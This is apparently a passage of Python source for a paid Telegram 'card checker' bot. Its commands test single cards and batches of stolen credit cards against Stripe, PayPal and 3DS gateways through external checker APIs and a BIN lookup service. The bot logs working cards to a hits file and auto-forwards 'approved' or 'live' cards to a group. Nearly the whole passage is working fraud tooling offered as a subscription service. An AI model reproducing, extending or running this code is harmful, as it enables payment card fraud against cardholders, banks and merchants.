        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from message or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    cc = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /sf CC|MM|YYYY|CVV or .cc CC|MM|YYYY|CVV")
                    return
            else:
                cc = parts[1]
        else:
            cc = message.text[4:].strip()

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe [10$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_sf_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto forward hits
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /sf] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mcc and .mcc
@bot.message_handler(commands=['msf'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msf'))
def handle_msf(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_sf_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Stripe [10$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_py_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(PY_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [0.1$]'
                    }
                    
                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
                message = data.get('response', 'Your card was declined.')
                
                if 'Live' in status or 'Approved' in status:
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [0.1$]'
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [0.1$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Paypal [0.1$]'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Paypal [0.1$]'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Paypal [0.1$]'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Paypal [0.1$]'
        }

# Handle both /cc and .cc
@bot.message_handler(commands=['py'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.py'))
def handle_py(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from message or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    cc = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /py CC|MM|YYYY|CVV or .py CC|MM|YYYY|CVV")
                    return
            else:
                cc = parts[1]
        else:
            cc = message.text[4:].strip()

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Paypal [0.1$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_py_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto forward hits
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /py] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mcc and .mcc
@bot.message_handler(commands=['mpy'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mpy'))
def handle_mpy(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_py_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Paypal [0.1$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_svbv_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(SVBV_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [0.1$]'
                    }
                    
                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
                message = data.get('response', 'Your card was declined.')
                
                if 'Live' in status or 'Approved' in status:
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': '3DS Site Based'
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': '3DS Site Based'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': '3DS Site Based'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': '3DS Site Based'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': '3DS Site Based'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': '3DS Site Based'
        }

# Handle both /cc and .cc
@bot.message_handler(commands=['svbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.svbv'))
def handle_svbv(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from message or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    cc = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /svbv CC|MM|YYYY|CVV or .svbv CC|MM|YYYY|CVV")
                    return
            else:
                cc = parts[1]
        else:
            cc = message.text[4:].strip()

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>3DS Site Based</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_svbv_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto forward hits
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /svbv] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mcc and .mcc
@bot.message_handler(commands=['msvbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msvbv'))
def handle_msvbv(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_svbv_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': '3DS Site Based'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")
        
# Start the bot
if __name__ == "__main__":
    print("✅ Script is running...")

    try:
        print("🔁 Notifying users...")
        notify_on_restart()
    except Exception as e:
        print("❌ Error in notify_on_restart:", e)

    try:
        print("⚡ Starting polling...")
        bot.infinity_polling()
    except Exception as e:
        print("❌ Polling crashed:", e)
 
